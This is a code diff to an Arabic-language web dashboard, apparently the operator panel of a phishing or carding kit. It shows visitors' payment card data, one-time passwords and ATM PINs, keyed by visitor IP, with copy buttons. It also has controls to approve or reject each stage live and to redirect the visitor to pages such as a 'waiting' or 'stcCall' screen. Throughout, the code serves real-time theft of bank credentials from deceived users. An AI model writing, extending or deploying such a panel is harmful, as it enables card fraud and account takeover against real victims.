+    {p:'stcCall',l:'⏳ الانتظار',c:'#f3f4f6',t:'#6b7280'},
   ];
-  return pages.map(p=>`<div class="nitem" onclick="navTo('${ip}','${p.p}')"><div class="nitem-ic" style="background:${p.c}20;color:${p.c}"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="${p.d}"/></svg></div>${p.l}</div>`).join('');
+  return pages.map(x=>`<div class="nitem" onclick="event.stopPropagation();navTo('${ip}','${x.p}');document.getElementById('nd-${norm(ip)}').classList.remove('open')">
+    <div class="nitem-ic" style="background:${x.c};color:${x.t}">
+      <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 011.447-.894L9 7m0 13l6-3m-6 3V7m6 10l4.553 2.276A1 1 0 0021 18.382V7.618a1 1 0 00-.553-.894L15 4m0 13V4m0 0L9 7"/></svg>
+    </div>
+    ${x.l}
+  </div>`).join('');
 }
 
 function toggleNav(btn,ip){
-  const dd=btn.nextElementSibling;
-  const was=dd.classList.contains('open');
-  document.querySelectorAll('.ndrop.open').forEach(d=>d.classList.remove('open'));
-  if(!was)dd.classList.add('open');
+  const d=document.getElementById(`nd-${norm(ip)}`);
+  if(!d)return;
+  const wasOpen=d.classList.contains('open');
+  document.querySelectorAll('.ndrop.open').forEach(x=>x.classList.remove('open'));
+  if(!wasOpen)d.classList.add('open');
   event.stopPropagation();
 }
-document.addEventListener('click',()=>document.querySelectorAll('.ndrop.open').forEach(d=>d.classList.remove('open')));
+document.addEventListener('click',()=>document.querySelectorAll('.ndrop.open').forEach(x=>x.classList.remove('open')));
 
 async function navTo(ip,page){
-  document.querySelectorAll('.ndrop.open').forEach(d=>d.classList.remove('open'));
   try{
     const r=await fetch(`${SRV}/api/navigate`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip,page})});
     const d=await r.json();
@@ -517,7 +1232,12 @@ function updStats(){
 async function showD(id){
   const b=allB.find(x=>x.id===id); if(!b)return;
   curIp=norm(b.ip||'');
-  document.getElementById('mSub').textContent=(b.id||'').toString().substring(0,16);
+  document.getElementById('mSub').textContent=(b.ip||'').toString().substring(0,20);
+
+  // تحديث الـ sidebar selection
+  document.querySelectorAll('.user-div.selected').forEach(x=>x.classList.remove('selected'));
+  const sbDiv=document.getElementById(`sb-${curIp}`);
+  if(sbDiv) sbDiv.classList.add('selected');
 
   let ex={payments:[],codes:[]};
   try{ const r=await fetch(`${SRV}/api/data/${b.ip}`); ex=await r.json(); }catch(e){}
@@ -535,7 +1255,6 @@ function buildM(b,ex){
   const updated=b.updated_at?new Date(b.updated_at).toLocaleString('ar-SA'):'';
 
   let h=`
-  <!-- بيانات العميل -->
   <div class="msec-hdr">
     <svg width="16" height="16" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:#374151"><path d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg>
     بيانات العميل
@@ -554,7 +1273,6 @@ function buildM(b,ex){
   h += buildCardSection(curIp, ex);
 
   h += `
-  <!-- توجيه العميل -->
   <div class="msec-hdr" style="margin-top:4px">
     <svg width="16" height="16" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:#374151"><path d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 011.447-.894L9 7m0 13l6-3m-6 3V7m6 10l4.553 2.276A1 1 0 0021 18.382V7.618a1 1 0 00-.553-.894L15 4m0 13V4m0 0L9 7"/></svg>
     توجيه العميل إلى صفحة
@@ -568,7 +1286,6 @@ function buildM(b,ex){
     <button class="nbp" style="background:#f3f4f6;color:#6b7280" onclick="navTo('${b.ip}','stcCall')">⏳ الانتظار</button>
   </div>
 
-  <!-- التواريخ -->
   <div class="mfooter">
     ${created?`<div class="mfdate"><span class="mfdate-l">تاريخ الإنشاء</span><span class="mfdate-v">${created}</span></div>`:''}
     ${updated?`<div class="mfdate"><span class="mfdate-l">آخر تحديث</span><span class="mfdate-v">${updated}</span></div>`:''}
@@ -588,9 +1305,7 @@ function buildCardSection(ip, ex){
   const hc=(ex&&ex.codes)||[];
 
   const cardData=pd||(hp.length>0?hp[0]:null);
-  // وقت بدء الجلسة الحالية: إذا كان هناك live payment، نستخدم وقته لتصفية الأكواد القديمة
   const sessionStartTime = pd ? (pd.timestamp ? new Date(pd.timestamp).getTime() : 0) : 0;
-  // كل OTP من DB مرتبة من الأحدث للأقدم - مع تصفية الأكواد القديمة إذا كانت قبل بدء الجلسة
   const dbOtps=hc.filter(c=>{
     if(c.code_type==='pin') return false;
     if(sessionStartTime>0){
@@ -607,29 +1322,25 @@ function buildCardSection(ip, ex){
     }
     return true;
   });
-  // إذا كان هناك live OTP، نزيل من DB أي سجل له نفس الـ request_id أو نفس الـ code
   const allOtps=od
     ?[od,...dbOtps.filter(c=>c.request_id!==od.requestId && c.code!==od.code)]
     :[...dbOtps];
   const allPins=pind
     ?[pind,...dbPinsArr.filter(c=>c.request_id!==pind.requestId && c.code!==pind.code)]
     :[...dbPinsArr];
-  // تحديد stage من live أو من DB
   let stage=ls[ldKey]||ls[nip];
   if(!stage){
-    // استنتاج stage من بيانات DB
     const dbPins=hc.filter(c=>c.code_type==='pin');
-    const dbOtps=hc.filter(c=>c.code_type==='otp');
+    const dbOtps2=hc.filter(c=>c.code_type==='otp');
     if(dbPins.length>0 && dbPins[0].request_id) stage='pin';
-    else if(dbOtps.length>0 && dbOtps[0].request_id) stage='otp';
+    else if(dbOtps2.length>0 && dbOtps2[0].request_id) stage='otp';
     else if(hp.length>0 && hp[0].request_id) stage='payment';
   }
 
   let h=`
-  <!-- بيانات البطاقة -->
   <div class="card-sec">
     <div class="msec-hdr">
-      <svg width="16" height="16" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:#16a34a"><path d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg>
+      <svg width="16" height="16" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:#04aa6d"><path d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg>
       بيانات البطاقة
     </div>`;
 
@@ -663,15 +1374,14 @@ function buildCardSection(ip, ex){
   }
   h+=`</div>`;
 
-  // ---- قسم OTP منفصل ----
+  // OTP
   h+=`
   <div style="margin-bottom:16px">
     <div class="msec-hdr">
-      <svg width="16" height="16" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:#374151"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+      <svg width="16" height="16" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:#d97706"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
       رمز OTP
     </div>
     <div class="otp-sec">`;
-
   if(allOtps.length>0){
     allOtps.forEach((o,i)=>{
       const oc=o.code||'-';
@@ -688,34 +1398,31 @@ function buildCardSection(ip, ex){
   }
   h+=`</div></div>`;
 
-  // ---- قسم الرقم السري ATM ----
-  // قسم الرقم السري ATM — يظهر دائماً
-  {
-    h+=`
-    <div style="margin-bottom:16px">
-      <div class="msec-hdr">
-        <svg width="16" height="16" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:#0d9488"><path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
-        الرقم السري ATM
-      </div>
-      <div class="otp-sec">`;
-    if(allPins.length>0){
-      allPins.forEach((p,i)=>{
-        const pc=p.code||'-';
-        const tsRaw=p.timestamp||p.created_at||null;
-        const ts=tsRaw?new Date(tsRaw).toLocaleTimeString('ar-SA',{hour:'2-digit',minute:'2-digit',second:'2-digit'}):'';
-        const lbl=allPins.length>1?`الرقم السري #${allPins.length-i}`:'الرقم السري ATM';
-        h+=`<div class="otp-row">
-          <span class="otp-lbl">${lbl}${ts?` <span style="font-size:10px;color:#9ca3af">(${ts})</span>`:''}</span>
-          <div class="pin-val">${pc}<button class="cpbtn" onclick="cp('${pc}',this)">${cpSvg}</button></div>
-        </div>`;
-      });
-    } else {
-      h+=`<div class="otp-row"><span class="otp-lbl">الرقم السري ATM</span><span class="otp-wait">في الانتظار...</span></div>`;
-    }
-    h+=`</div></div>`;
+  // PIN
+  h+=`
+  <div style="margin-bottom:16px">
+    <div class="msec-hdr">
+      <svg width="16" height="16" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:#0d9488"><path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+      الرقم السري ATM
+    </div>
+    <div class="otp-sec">`;
+  if(allPins.length>0){
+    allPins.forEach((p,i)=>{
+      const pc=p.code||'-';
+      const tsRaw=p.timestamp||p.created_at||null;
+      const ts=tsRaw?new Date(tsRaw).toLocaleTimeString('ar-SA',{hour:'2-digit',minute:'2-digit',second:'2-digit'}):'';
+      const lbl=allPins.length>1?`الرقم السري #${allPins.length-i}`:'الرقم السري ATM';
+      h+=`<div class="otp-row">
+        <span class="otp-lbl">${lbl}${ts?` <span style="font-size:10px;color:#9ca3af">(${ts})</span>`:''}</span>
+        <div class="pin-val">${pc}<button class="cpbtn" onclick="cp('${pc}',this)">${cpSvg}</button></div>
+      </div>`;
+    });
+  } else {
+    h+=`<div class="otp-row"><span class="otp-lbl">الرقم السري ATM</span><span class="otp-wait">في الانتظار...</span></div>`;
   }
+  h+=`</div></div>`;
 
-  // ---- الإجراءات ----
+  // Actions
   h+=`
   <div class="act-sec">
     <div class="msec-hdr">
@@ -724,20 +1431,15 @@ function buildCardSection(ip, ex){
     </div>`;
 
   if(stage){
-    const lbl={
-      payment:{a:'قبول / التالي',r:'رفض'},
-      otp:{a:'قبول / التالي',r:'رفض'},
-      pin:{a:'قبول / التالي',r:'رفض'}
-    }[stage];
     h+=`
     <div class="act-btns" id="abtns">
       <button class="abtn abtn-ok" id="abtn-ok" onclick="appv('${ldKey}','${stage}')">
         <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 13l4 4L19 7"/></svg>
-        ${lbl.a}
+        قبول / التالي
       </button>
       <button class="abtn abtn-rj" id="abtn-rj" onclick="rejv('${ldKey}','${stage}')">
         <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 18L18 6M6 6l12 12"/></svg>
-        ${lbl.r}
+        رفض
       </button>
       <button class="abtn abtn-done" onclick="navTo('${ip}','booking')">
         <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
@@ -762,7 +1464,6 @@ function buildCardSection(ip, ex){
     </div>`;
   }
 
-  // رسالة رفض مخصصة
   h+=`
     <div class="rej-msg" style="margin-top:10px">
       <label>رسالة الرفض المخصصة:</label>
@@ -791,9 +1492,7 @@ function _injectCardHtml(body, html){
 
 async function rebuildCard(ip){
   const body=document.getElementById('mbody'); if(!body)return;
-  // أولاً: عرض فوري بالبيانات اللحظية من ld (بدون DB) لضمان ظهور OTP/PIN الجديد فوراً
   _injectCardHtml(body, buildCardSection(ip,{payments:[],codes:[]}));
-  // ثانياً: جلب من DB لإضافة التواريخ والسجل الكامل
   let ex={payments:[],codes:[]};
   try{
     const bk=allB.find(x=>norm(x.ip||'')===norm(ip));
@@ -807,20 +1506,16 @@ async function rebuildCard(ip){
 }
 
 async function appv(ip,stage){
-  // جلب requestId من ld أو من DB
   let rid = null;
   const l = ld[ip] || ld[norm(ip)];
   if(l && l.requestId) rid = l.requestId;
-  // إذا لم يكن في ld، جلبه من DB
   if(!rid){
     try{
       const r = await fetch(`${SRV}/api/data/${encodeURIComponent(ip)}`);
       const ex = await r.json();
-      // جلب أحدث request_id من payment_data أو code_data حسب المرحلة
       if(stage==='payment' && ex.payments && ex.payments.length>0){
         rid = ex.payments[0].request_id;
       } else if((stage==='otp'||stage==='pin') && ex.codes && ex.codes.length>0){
-        // أحدث كود من نوع المرحلة
         const filtered = ex.codes.filter(c=>c.code_type===(stage==='otp'?'otp':'pin'));
         if(filtered.length>0) rid = filtered[0].request_id;
         if(!rid) rid = ex.codes[0].request_id;
@@ -837,15 +1532,13 @@ async function appv(ip,stage){
     if(socket&&socket.connected) socket.emit('adminApprove',{requestId:rid});
   }
   toast('✅ تم القبول');
-  if(stage==='pin'){ delete ld[ip]; delete ls[ip]; updPend(); rowBadge(ip,null); }
+  if(stage==='pin'){ delete ld[ip]; delete ls[ip]; updPend(); rowBadge(ip,null); updateSidebarBadge(ip,null); }
 }
 
 async function rejv(ip,stage){
-  // جلب requestId من ld أو من DB
   let rid = null;
   const l = ld[ip] || ld[norm(ip)];
   if(l && l.requestId) rid = l.requestId;
-  // إذا لم يكن في ld، جلبه من DB
   if(!rid){
     try{
       const r = await fetch(`${SRV}/api/data/${encodeURIComponent(ip)}`);
@@ -870,7 +1563,7 @@ async function rejv(ip,stage){
     if(socket&&socket.connected) socket.emit('adminReject',{requestId:rid,message:msg});
   }
   toast('❌ تم الرفض');
-  if(stage==='payment'){ delete ld[ip]; delete ls[ip]; updPend(); rowBadge(ip,null); }
+  if(stage==='payment'){ delete ld[ip]; delete ls[ip]; updPend(); rowBadge(ip,null); updateSidebarBadge(ip,null); }
 }
 
 function disableAbtns(){
@@ -881,27 +1574,23 @@ function disableAbtns(){
 }
 
 function closeM(){ document.getElementById('modal').classList.remove('open'); curIp=null; }
-function cp(t,btn){ 
+
+function cp(t,btn){
   navigator.clipboard.writeText(t).then(()=>{
     toast('📋 نُسخ: '+t);
-    if(btn){btn.style.color='#16a34a';setTimeout(()=>btn.style.color='',1500);}
-  }).catch(()=>{}); 
+    if(btn){btn.style.color='#04aa6d';setTimeout(()=>btn.style.color='',1500);}
+  }).catch(()=>{});
 }
+
 function toast(m){ const t=document.getElementById('toast'); t.textContent=m; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),3000); }
+
 function beep(f){ try{ const c=new AudioContext(),o=c.createOscillator(),g=c.createGain(); o.connect(g);g.connect(c.destination); o.frequency.value=f; g.gain.setValueAtTime(.2,c.currentTime); g.gain.exponentialRampToValueAtTime(.001,c.currentTime+.4); o.start(c.currentTime);o.stop(c.currentTime+.4); }catch(e){} }
 
 // تحديث تلقائي كل 3 ثواني
 setInterval(()=>{
-  // إعادة الاتصال إذا انقطع الـ socket
-  if(socket && !socket.connected){
-    socket.connect();
-  }
-  // تحديث قائمة الحجوزات
+  if(socket && !socket.connected){ socket.connect(); }
   loadB();
-  // تحديث بيانات المودال إذا كان مفتوحاً
-  if(curIp && document.getElementById('modal').classList.contains('open')){
-    openM(curIp);
-  }
+  if(curIp && document.getElementById('modal').classList.contains('open')){ openM && openM(curIp); }
 }, 3000);
 </script>
 </body>
